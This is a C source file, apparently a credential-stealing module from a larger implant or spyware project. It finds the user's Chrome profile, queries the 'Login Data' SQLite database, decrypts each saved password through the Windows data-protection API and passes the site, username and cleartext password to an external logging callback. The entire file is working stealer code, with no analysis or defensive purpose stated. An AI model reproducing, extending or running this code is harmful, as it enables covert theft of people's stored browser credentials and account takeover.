
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <userenv.h>
#include <shlobj.h>
#pragma comment(lib,"userenv.lib")

#include "..\\common.h"

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

// SQLITE Library functions
typedef int (*sqlite3_open)(const char *, void **);
typedef int (*sqlite3_close)(void *);
typedef int (*sqlite3_exec)(void *, const char *, int (*callback)(void*,int,char**,char**), void *, char **);

sqlite3_open	chrome_SQLITE_open = NULL;
sqlite3_close	chrome_SQLITE_close = NULL;
sqlite3_exec	chrome_SQLITE_exec = NULL;

HMODULE libsqlch = NULL;

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

extern int DirectoryExists(WCHAR *path);
extern char *HM_CompletePath(char *file_name, char *buffer);
extern char *GetDosAsciiName(WCHAR *orig_path);

int InitCHLibs()
{
	char buffer[MAX_PATH];
	if (!(libsqlch = LoadLibrary(HM_CompletePath("sqlite.dll", buffer)))) {
		return 0;
	}

	// sqlite functions
	chrome_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlch, "sqlite3_open");
	chrome_SQLITE_close = (sqlite3_close) GetProcAddress(libsqlch, "sqlite3_close");
	chrome_SQLITE_exec = (sqlite3_exec) GetProcAddress(libsqlch, "sqlite3_exec");

	if (!chrome_SQLITE_open || !chrome_SQLITE_close || !chrome_SQLITE_exec) {
		return 0;
	}

	return 1;
}

void UnInitCHLibs()
{
	FreeLibrary(libsqlch);
}

struct chp_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};


int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
{
	DATA_BLOB input;
	input.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(cryptData));
	DATA_BLOB output;
	DWORD blen;

	for(blen=128; blen<=2048; blen+=16) {
		input.cbData = static_cast<DWORD>(blen);
		if (FNC(CryptUnprotectData)(&input, NULL, NULL, NULL, NULL, 0, &output))
			break;
	}
	if (blen>=2048)
		return 0;

	CHAR *decrypted = (CHAR *)malloc(clearSize);
	if (!decrypted) {
		LocalFree(output.pbData);
		return 0;
	}

	memset(decrypted, 0, clearSize);
	memcpy(decrypted, output.pbData, (clearSize < output.cbData) ? clearSize - 1 : output.cbData);

	_snwprintf_s(clearData, clearSize, _TRUNCATE, L"%S", decrypted);

	free(decrypted);
	LocalFree(output.pbData);

	return 1;
}

int parse_chrome_signons(void *NotUsed, int argc, char **argv, char **azColName)
{
	struct chp_entry chentry;
	
	ZeroMemory(&chentry, sizeof(chentry));

	for(int i=0; i<argc; i++){
		if (!strcmp(azColName[i], "origin_url")) {
			swprintf_s(chentry.service, 255, L"Chrome");
			_snwprintf_s(chentry.resource, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], "username_value")) {
			_snwprintf_s(chentry.user_value, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], "password_value")) {
			DecryptPass(argv[i], chentry.pass_value, 255);
		}
	}

	LogPassword(chentry.service, chentry.resource, chentry.user_value, chentry.pass_value);
	
	return 0;
}

int DumpSqlCH(WCHAR *profilePath, WCHAR *signonFile)
{
	void *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	if (chrome_SQLITE_open == NULL)
		return 0;

	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
	SAFE_FREE(ascii_path);

	if ((rc = chrome_SQLITE_open(sqlPath, &db)))
		return 0;

	chrome_SQLITE_exec(db, "SELECT * FROM logins;", parse_chrome_signons, NULL, NULL);

	chrome_SQLITE_close(db);

	return 1;
}


WCHAR *GetCHProfilePath()
{
	WCHAR appPath[MAX_PATH];
	static WCHAR FullPath[MAX_PATH];

	memset(appPath, 0, sizeof(appPath));
	if (!FNC(SHGetSpecialFolderPathW)(NULL, appPath, CSIDL_LOCAL_APPDATA, TRUE))
		return NULL;

	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Google\\Chrome\\User Data\\Default", appPath);

	return FullPath;
}


int DumpChrome(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path

	ProfilePath = GetCHProfilePath();

	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
		return 0;
		
	if (!InitCHLibs())	
		return 0;

	DumpSqlCH(ProfilePath, L"Login Data"); 
	UnInitCHLibs();

	return 0;
}
